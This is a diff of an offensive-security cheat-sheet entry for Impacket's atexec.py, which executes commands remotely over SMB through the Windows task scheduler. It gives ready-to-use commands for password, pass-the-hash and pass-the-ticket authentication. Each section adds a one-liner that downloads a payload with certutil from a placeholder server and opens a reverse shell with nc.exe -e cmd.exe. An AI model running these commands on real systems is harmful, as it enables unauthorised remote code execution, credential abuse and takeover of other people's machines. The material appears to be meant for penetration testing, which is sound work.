@@ -1,19 +1,27 @@
-# atexec (imp)
+# atexec.py (imp)
 
 %  windows, impacket-exec
-
-## execute command view the task scheduler 
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
-Using \pipe\atsvc via SMB
 
+## desc
 ```
-atexec.py '<domain_fqdn>'/'<user>':'<password>'@<ip> "command"
-```
-
-## pth
-#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 Execute command view the task scheduler (using \pipe\atsvc via SMB)
-
 ```
-atexec.py -hashes <nt_hash> <user>@<ip> "command"
+
+## execute (creds)
+certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
+```bash
+atexec.py -debug <domain_fqdn>/<user>:'<password>'@<target_fqdn> <cmd>
+```
+
+## execute (pth)
+certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
+```bash
+atexec.py -debug -hashes :<nt_hash>  <domain_fqdn>/<user>@<target_fqdn> <cmd>
+```
+
+## execute (ptt)
+certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
+```bash
+KRB5CCNAME=<ccache> atexec.py -no-pass -k <target_fqdn> <cmd></cmd>
 ```
